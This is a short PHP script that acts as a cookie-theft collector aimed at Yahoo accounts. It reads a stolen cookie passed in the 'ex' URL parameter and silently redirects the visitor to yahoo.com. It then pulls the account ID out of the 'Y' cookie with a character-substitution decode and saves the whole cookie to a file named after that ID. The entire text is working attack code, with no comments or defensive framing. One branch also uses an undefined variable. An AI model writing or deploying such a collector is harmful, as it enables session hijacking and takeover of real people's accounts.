<?php
$redirect_to = 'http://yahoo.com';
if(!isset($_GET["ex"]) || empty($_GET["ex"]))  
{
echo "<meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=".$X44."\">";
} 
else 
{
$cookie = $_GET['ex'];
echo "<meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=".$redirect_to."\">";
$Y = explode("Y=", $cookie); $Y = $Y[1];
$Y = explode(";", $Y); $Y = $Y[0];
$yid = explode("l=", $Y); $yid = $yid[1];
$yid = explode("/o", $yid); $yid = $yid[0];
$str1 = "0123456789abcdefghijklmnopqrstuvwxyz-+._@";
$str2 = "abcdefghijklmnopqrstuvwxyz0123456789-+._@";
$id = "";
for($i = 0; $i < strlen($yid); $i++) $id .= $str2{strpos($str1, $yid{$i})};
if ($id != '') 
{
$rand = rand(0, 1000000);
$fcookie = "./cookies/".$id."_".$rand;
$fh = fopen($fcookie, 'w') or die("chmod???");
fwrite($fh, $cookie);
fclose($fh);
}
}
?>